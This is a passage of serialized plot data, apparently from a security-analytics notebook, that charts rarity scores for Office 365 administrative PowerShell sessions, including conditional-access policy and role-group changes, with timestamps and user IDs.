'{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/19/2020 2:29:03 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Test Policy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\3b13ea3c-c733-4eb8-bd19-67d308b2ea04', 'PolicyDetails': '{\\\"Version\\\":0,\\\"CreatedDateTime\\\":\\\"2020-05-19T13:34:15.2394934Z\\\",\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:39:04.7333386Z\\\",\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"None\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"Guests\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\",\\\"RequireCompliantDevice\\\"]}]}', 'PolicyLastUpdatedTime': '8/19/2020 5:55:34 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Yanivsh -CA Test', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\235bec94-f744-48ac-8314-5675953d2def', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"macOS\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/19/2020 5:55:31 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Megan MFA demo', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Update-RoleGroupMember', params={'Members': 'CBoehmSA;ComplianceAdmins_939735849', 'Identity': 'Compliance Management'})\",\"Cmd(name='Update-RoleGroupMember', params={'Members': 'CBoehmSA', 'Identity': 'Discovery Management'})\",\"Cmd(name='Update-RoleGroupMember', params={'Members': 'CBoehmSA;ComplianceAdmins_939735849', 'Identity': 'Compliance Management'})\"]],\"rarest_window3_likelihood\":{\"__ndarray__\":\"iI8J8UNthD/Nxus4F+h6PySId8Fi4IU/L6XbyRT3ej/XmkpTpXiEP2x775tbwHc/iI8J8UNthD8kiHfBYuCFP0MXINrzg4Q/iI8J8UNthD/Nxus4F+h6P4iPCfFDbYQ/15pKU6V4hD8kiHfBYuCFP4iPCfFDbYQ/iI8J8UNthD+IjwnxQ22EP4iPCfFDbYQ/RjaRHgy9az/XmkpTpXiEPySId8Fi4IU/7KjSzS+PhD8kiHfBYuCFP9eaSlOleIQ/Qxcg2vODhD++aFZpz2GEP75oVmnPYYQ/Qxcg2vODhD+IjwnxQ22EP75oVmnPYYQ/tASIMvClej+3XR8WpJqEP4iPCfFDbYQ/Qxcg2vODhD8FVC1OYVaEPy+l28kU93o/E8zG2kPhej+IjwnxQ22EP/lOXF6QuHE/iI8J8UNthD++aFZpz2GEP75oVmnPYYQ/BVQtTmFWhD/XmkpTpXiEPwsG2UjqtHo/7KjSzS+PhD+IjwnxQ22EPwsG2UjqtHo/iI8J8UNthD++aFZpz2GEP/0SymkqbYQ/Qxcg2vODhD+IjwnxQ22EP0MXINrzg4Q/vmhWac9hhD+IjwnxQ22EPySId8Fi4IU/15pKU6V4hD++aFZpz2GEPySId8Fi4IU/W1VTvZPSej++aFZpz2GEP/0SymkqbYQ/j/evYwWmhD+IjwnxQ22EP75oVmnPYYQ/7KjSzS+PhD+IjwnxQ22EP75oVmnPYYQ/JIh3wWLghT/Pxus4F+h6P1tVU72T0no//RLKaSpthD++aFZpz2GEP8ZeSECog4Q/iI8J8UNthD/Nxus4F+h6P7ZdHxakmoQ/lEw2+4X6cj9DFyDa84OEP0MXINrzg4Q//RLKaSpthD8FVC1OYVaEPwsG2UjqtHo/Qxcg2vODhD/I8KDGxRR7P6NojKlndXE/vmhWac9hhD8kiHfBYuCFP7QEiDLwpXo/wozM9byahD+IjwnxQ22EPySId8Fi4IU/vmhWac9hhD+IjwnxQ22EP4iPCfFDbYQ/JIh3wWLghT/I8KDGxRR7P0MXINrzg4Q/Qxcg2vODhD8kiHfBYuCFP4iPCfFDbYQ/z8brOBfoej/Pxus4F+h6PwsG2UjqtHo/t10fFqSahD8LXGWZcniEP83G6zgX6Ho/j/evYwWmhD+IjwnxQ22EP75oVmnPYYQ/vmhWac9hhD8kiHfBYuCFP9eaSlOleIQ/jvevYwWmhD8kiHfBYuCFP7ZdHxakmoQ/xl5IQKiDhD++aFZpz2GEP0MXINrzg4Q/o2iMqWd1cT/Nxus4F+h6PwsG2UjqtHo/yPCgxsUUez/Nxus4F+h6P0MXINrzg4Q/JIh3wWLghT/XmkpTpXiEP9eaSlOleIQ/z8brOBfoej/4KrRvANl6P63v2VbLw3o/iI8J8UNthD+IjwnxQ22EP9eaSlOleIQ/+Cq0bwDZej/XmkpTpXiEP4iPCfFDbYQ/iI8J8UNthD/9EsppKm2EP0MXINrzg4Q/iI8J8UNthD/Pxus4F+h6P8jwoMbFFHs/15pKU6V4hD9mFBl9kFHFPg==\",\"dtype\":\"float64\",\"order\":\"little\",\"shape\":[146]},\"time_col\":[\"2020-06-21 02:36:46+00:00\",\"2020-06-21 05:31:34+00:00\",\"2020-06-22 02:27:06+00:00\",\"2020-06-22 02:30:52+00:00\",\"2020-06-22 04:55:59+00:00\",\"2020-06-23 02:31:32+00:00\",\"2020-06-23 05:35:26+00:00\",\"2020-06-24 02:00:55+00:00\",\"2020-06-24 02:06:55+00:00\",\"2020-06-24 05:21:02+00:00\",\"2020-06-25 02:15:42+00:00\",\"2020-06-26 03:41:02+00:00\",\"2020-06-26 06:56:14+00:00\",\"2020-06-27 02:36:03+00:00\",\"2020-06-27 02:40:59+00:00\",\"2020-06-27 05:10:41+00:00\",\"2020-06-28 02:25:45+00:00\",\"2020-06-28 05:25:42+00:00\",\"2020-06-28 05:30:53+00:00\",\"2020-06-29 02:01:49+00:00\",\"2020-06-29 04:50:44+00:00\",\"2020-06-29 04:56:13+00:00\",\"2020-06-30 02:11:11+00:00\",\"2020-06-30 02:16:20+00:00\",\"2020-06-30 05:15:37+00:00\",\"2020-07-01 01:56:06+00:00\",\"2020-07-01 05:20:57+00:00\",\"2020-07-02 02:16:17+00:00\",\"2020-07-02 05:01:42+00:00\",\"2020-07-03 02:38:45+00:00\",\"2020-07-03 05:38:39+00:00\",\"2020-07-04 02:10:37+00:00\",\"2020-07-04 05:06:39+00:00\",\"2020-07-05 02:15:59+00:00\",\"2020-07-05 05:15:54+00:00\",\"2020-07-06 01:51:03+00:00\",\"2020-07-06 04:41:38+00:00\",\"2020-07-07 02:01:28+00:00\",\"2020-07-08 02:40:54+00:00\",\"2020-07-08 05:06:16+00:00\",\"2020-07-09 02:45:55+00:00\",\"2020-07-10 02:55:37+00:00\",\"2020-07-10 05:41:11+00:00\",\"2020-07-11 02:31:00+00:00\",\"2020-07-11 05:11:24+00:00\",\"2020-07-11 05:15:56+00:00\",\"2020-07-12 02:56:23+00:00\",\"2020-07-12 05:40:46+00:00\",\"2020-07-13 03:13:51+00:00\",\"2020-07-13 05:46:02+00:00\",\"2020-07-13 05:51:32+00:00\",\"2020-07-14 03:15:14+00:00\",\"2020-07-14 05:36:52+00:00\",\"2020-07-15 03:00:52+00:00\",\"2020-07-15 05:36:56+00:00\",\"2020-07-16 02:40:40+00:00\",\"2020-07-16 05:06:29+00:00\",\"2020-07-16 05:14:07+00:00\",\"2020-07-17 02:07:43+00:00\",\"2020-07-17 05:06:25+00:00\",\"2020-07-17 05:10:59+00:00\",\"2020-07-18 05:31:05+00:00\",\"2020-07-19 05:46:03+00:00\",\"2020-07-20 02:30:58+00:00\",\"2020-07-20 06:16:41+00:00\",\"2020-07-21 02:16:20+00:00\",\"2020-07-21 05:06:31+00:00\",\"2020-07-22 02:20:45+00:00\",\"2020-07-22 05:21:38+00:00\",\"2020-07-23 02:26:13+00:00\",\"2020-07-23 02:30:51+00:00\",\"2020-07-23 04:30:50+00:00\",\"2020-07-23 05:31:27+00:00\",\"2020-07-24 02:41:29+00:00\",\"2020-07-24 05:05:49+00:00\",\"2020-07-25 02:30:48+00:00\",\"2020-07-25 05:46:32+00:00\",\"2020-07-26 02:41:28+00:00\",\"2020-07-26 02:47:29+00:00\",\"2020-07-26 05:29:37+00:00\",\"2020-07-27 02:16:05+00:00\",\"2020-07-27 05:21:25+00:00\",\"2020-07-28 02:11:05+00:00\",\"2020-07-28 05:31:49+00:00\",\"2020-07-28 05:35:59+00:00\",\"2020-07-28 05:40:57+00:00\",\"2020-07-29 01:51:42+00:00\",\"2020-07-29 02:46:29+00:00\",\"2020-07-29 05:24:14+00:00\",\"2020-07-29 05:26:49+00:00\",\"2020-07-30 02:25:55+00:00\",\"2020-07-30 05:21:00+00:00\",\"2020-07-31 02:45:46+00:00\",\"2020-07-31 02:50:49+00:00\",\"2020-07-31 05:05:42+00:00\",\"2020-08-01 02:35:39+00:00\",\"2020-08-01 05:36:25+00:00\",\"2020-08-01 05:41:31+00:00\",\"2020-08-02 02:21:03+00:00\",\"2020-08-02 05:36:35+00:00\",\"2020-08-03 02:16:00+00:00\",\"2020-08-03 02:21:26+00:00\",\"2020-08-03 05:26:28+00:00\",\"2020-08-04 01:56:07+00:00\",\"2020-08-04 05:46:29+00:00\",\"2020-08-05 02:31:32+00:00\",\"2020-08-05 05:25:34+00:00\",\"2020-08-05 05:51:25+00:00\",\"2020-08-05 08:20:38+00:00\",\"2020-08-05 16:50:31+00:00\",\"2020-08-06 02:25:53+00:00\",\"2020-08-06 05:26:17+00:00\",\"2020-08-06 06:55:49+00:00\",\"2020-08-06 08:16:06+00:00\",\"2020-08-06 20:16:01+00:00\",\"2020-08-06 20:51:13+00:00\",\"2020-08-06 23:11:04+00:00\",\"2020-08-07 03:11:34+00:00\",\"2020-08-07 03:26:13+00:00\",\"2020-08-07 05:41:05+00:00\",\"2020-08-08 02:15:55+00:00\",\"2020-08-08 05:16:44+00:00\",\"2020-08-08 09:36:37+00:00\",\"2020-08-09 01:56:24+00:00\",\"2020-08-09 05:15:38+00:00\",\"2020-08-10 02:36:00+00:00\",\"2020-08-10 05:25:57+00:00\",\"2020-08-10 05:30:33+00:00\",\"2020-08-11 03:04:21+00:00\",\"2020-08-11 05:19:46+00:00\",\"2020-08-12 01:56:17+00:00\",\"2020-08-12 05:36:26+00:00\",\"2020-08-13 02:56:44+00:00\",\"2020-08-13 05:35:54+00:00\",\"2020-08-14 02:32:07+00:00\",\"2020-08-14 05:51:15+00:00\",\"2020-08-16 02:06:26+00:00\",\"2020-08-16 05:11:57+00:00\",\"2020-08-17 02:05:52+00:00\",\"2020-08-17 05:20:45+00:00\",\"2020-08-18 02:32:00+00:00\",\"2020-08-18 02:35:50+00:00\",\"2020-08-18 05:26:24+00:00\",\"2020-08-19 02:36:20+00:00\",\"2020-08-19 06:06:00+00:00\",\"2020-07-29 20:11:27+00:00\"],\"y_index\":[1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]},\"selected\":{\"id\":\"1506\"},\"selection_policy\":{\"id\":\"1505\"}},\"id\":\"1456\",\"type\":\"ColumnDataSource\"},{\"attributes\":{},\"id\":\"1446\",\"type\":\"LinearScale\"},{\"attributes\":{\"fill_alpha\":{\"value\":0.1},\"fill_color\":{\"value\":\"navy\"},\"line_alpha\":{\"value\":0.1},\"line_color\":{\"value\":\"navy\"},\"x\":{\"field\":\"begin\"},\"y\":{\"field\":\"rarest_window3_likelihood\"}},\"id\":\"1434\",\"type\":\"Circle\"},{\"attributes\":{\"num_minor_ticks\":5,\"tickers\":[{\"id\":\"1492\"},{\"id\":\"1493\"},{\"id\":\"1494\"},{\"id\":\"1495\"},{\"id\":\"1496\"},{\"id\":\"1497\"},{\"id\":\"1498\"},{\"id\":\"1499\"},{\"id\":\"1500\"},{\"id\":\"1501\"},{\"id\":\"1502\"},{\"id\":\"1503\"}]},\"id\":\"1449\",\"type\":\"DatetimeTicker\"},{\"attributes\":{\"months\":[0,6]},\"id\":\"1487\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"axis\":{\"id\":\"1448\"},\"ticker\":null},\"id\":\"1451\",\"type\":\"Grid\"},{\"attributes\":{\"months\":[0,4,8]},\"id\":\"1486\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"active_multi\":{\"id\":\"1462\"},\"tools\":[{\"id\":\"1462\"}]},\"id\":\"1452\",\"type\":\"Toolbar\"},{\"attributes\":{\"days\":[\"%m-%d %H:%M\"],\"hours\":[\"%H:%M:%S\"],\"milliseconds\":[\"%H:%M:%S.%3N\"],\"minutes\":[\"%H:%M:%S\"],\"seconds\":[\"%H:%M:%S\"]},\"id\":\"1454\",\"type\":\"DatetimeTickFormatter\"},{\"attributes\":{},\"id\":\"1488\",\"type\":\"YearsTicker\"},{\"attributes\":{\"months\":[0,2,4,6,8,10]},\"id\":\"1485\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"months\":[0,1,2,3,4,5,6,7,8,9,10,11]},\"id\":\"1484\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"days\":[1,4,7,10,13,16,19,22,25,28]},\"id\":\"1481\",\"type\":\"DaysTicker\"},{\"attributes\":{\"base\":24,\"mantissas\":[1,2,4,6,8,12],\"max_interval\":43200000.0,\"min_interval\":3600000.0,\"num_minor_ticks\":0},\"id\":\"1479\",\"type\":\"AdaptiveTicker\"},{\"attributes\":{\"days\":[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31]},\"id\":\"1480\",\"type\":\"DaysTicker\"},{\"attributes\":{\"days\":[1,8,15,22]},\"id\":\"1482\",\"type\":\"DaysTicker\"},{\"attributes\":{\"days\":[1,15]},\"id\":\"1483\",\"type\":\"DaysTicker\"},{\"attributes\":{},\"id\":\"1476\",\"type\":\"AllLabels\"},{\"attributes\":{\"source\":{\"id\":\"1456\"}},\"id\":\"1461\",\"type\":\"CDSView\"},{\"attributes\":{\"fill_color\":{\"value\":\"blue\"},\"line_color\":{\"value\":\"blue\"},\"x\":{\"field\":\"begin\"},\"y\":{\"field\":\"y_index\"}},\"id\":\"1458\",\"type\":\"Circle\"},{\"attributes\":{\"overlay\":{\"id\":\"1463\"},\"x_range\":{\"id\":\"1400\"},\"y_range\":null},\"id\":\"1462\",\"type\":\"RangeTool\"},{\"attributes\":{\"fill_alpha\":0.2,\"fill_color\":\"navy\",\"level\":\"overlay\",\"line_alpha\":1.0,\"line_color\":\"black\",\"line_dash\":[2,2],\"line_width\":0.5,\"syncable\":false},\"id\":\"1463\",\"type\":\"BoxAnnotation\"},{\"attributes\":{\"text\":\"Timeline\"},\"id\":\"1398\",\"type\":\"Title\"},{\"attributes\":{\"data_source\":{\"id\":\"1456\"},\"glyph\":{\"id\":\"1458\"},\"hover_glyph\":null,\"muted_glyph\":null,\"nonselection_glyph\":{\"id\":\"1459\"},\"view\":{\"id\":\"1461\"}},\"id\":\"1460\",\"type\":\"GlyphRenderer\"},{\"attributes\":{\"fill_alpha\":{\"value\":0.1},\"fill_color\":{\"value\":\"blue\"},\"line_alpha\":{\"value\":0.1},\"line_color\":{\"value\":\"blue\"},\"x\":{\"field\":\"begin\"},\"y\":{\"field\":\"y_index\"}},\"id\":\"1459\",\"type\":\"Circle\"},{\"attributes\":{\"base\":60,\"mantissas\":[1,2,5,10,15,20,30],\"max_interval\":1800000.0,\"min_interval\":1000.0,\"num_minor_ticks\":0},\"id\":\"1478\",\"type\":\"AdaptiveTicker\"},{\"attributes\":{\"days\":[\"%m-%d %H:%M\"],\"hours\":[\"%H:%M:%S\"],\"milliseconds\":[\"%H:%M:%S.%3N\"],\"minutes\":[\"%H:%M:%S\"],\"seconds\":[\"%H:%M:%S\"]},\"id\":\"1429\",\"type\":\"DatetimeTickFormatter\"},{\"attributes\":{\"below\":[{\"id\":\"1408\"}],\"center\":[{\"id\":\"1411\"},{\"id\":\"1415\"}],\"height\":300,\"left\":[{\"id\":\"1412\"}],\"min_border_left\":50,\"renderers\":[{\"id\":\"1435\"}],\"title\":{\"id\":\"1398\"},\"toolbar\":{\"id\":\"1422\"},\"toolbar_location\":\"above\",\"width\":900,\"x_range\":{\"id\":\"1400\"},\"x_scale\":{\"id\":\"1404\"},\"y_range\":{\"id\":\"1402\"},\"y_scale\":{\"id\":\"1406\"}},\"id\":\"1397\",\"subtype\":\"Figure\",\"type\":\"Plot\"},{\"attributes\":{\"mantissas\":[1,2,5],\"max_interval\":500.0,\"num_minor_ticks\":0},\"id\":\"1477\",\"type\":\"AdaptiveTicker\"},{\"attributes\":{\"callback\":null,\"formatters\":{\"@begin\":\"datetime\"},\"tooltips\":[[\"begin\",\"@begin{%F %T.%3N}\"],[\"rarest_window3_likelihood\",\"@rarest_window3_likelihood\"],[\"time_col\",\"@time_col\"],[\"ClientIP\",\"@ClientIP\"],[\"UserId\",\"@UserId\"],[\"rarest_window3\",\"@rarest_window3\"]]},\"id\":\"1396\",\"type\":\"HoverTool\"},{\"attributes\":{\"end\":1598328175400.0,\"start\":1592195990600.0},\"id\":\"1400\",\"type\":\"Range1d\"},{\"attributes\":{\"mantissas\":[1,2,5],\"max_interval\":500.0,\"num_minor_ticks\":0},\"id\":\"1492\",\"type\":\"AdaptiveTicker\"},{\"attributes\":{\"base\":60,\"mantissas\":[1,2,5,10,15,20,30],\"max_interval\":1800000.0,\"min_interval\":1000.0,\"num_minor_ticks\":0},\"id\":\"1493\",\"type\":\"AdaptiveTicker\"},{\"attributes\":{\"days\":[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31]},\"id\":\"1495\",\"type\":\"DaysTicker\"},{\"attributes\":{\"base\":24,\"mantissas\":[1,2,4,6,8,12],\"max_interval\":43200000.0,\"min_interval\":3600000.0,\"num_minor_ticks\":0},\"id\":\"1494\",\"type\":\"AdaptiveTicker\"},{\"attributes\":{\"months\":[0,1,2,3,4,5,6,7,8,9,10,11]},\"id\":\"1499\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"months\":[0,2,4,6,8,10]},\"id\":\"1500\",\"type\":\"MonthsTicker\"},{\"attributes\":{},\"id\":\"1471\",\"type\":\"AllLabels\"},{\"attributes\":{\"days\":[1,4,7,10,13,16,19,22,25,28]},\"id\":\"1496\",\"type\":\"DaysTicker\"},{\"attributes\":{\"days\":[1,15]},\"id\":\"1498\",\"type\":\"DaysTicker\"},{\"attributes\":{\"months\":[0,6]},\"id\":\"1502\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"days\":[1,8,15,22]},\"id\":\"1497\",\"type\":\"DaysTicker\"},{\"attributes\":{},\"id\":\"1503\",\"type\":\"YearsTicker\"},{\"attributes\":{\"months\":[0,4,8]},\"id\":\"1501\",\"type\":\"MonthsTicker\"},{\"attributes\":{},\"id\":\"1473\",\"type\":\"BasicTickFormatter\"},{\"attributes\":{},\"id\":\"1474\",\"type\":\"AllLabels\"},{\"attributes\":{},\"id\":\"1402\",\"type\":\"DataRange1d\"},{\"attributes\":{\"data\":{\"ClientIP\":[\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"nan\",\"20.185.182.48:37965\"],\"UserId\":[\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator 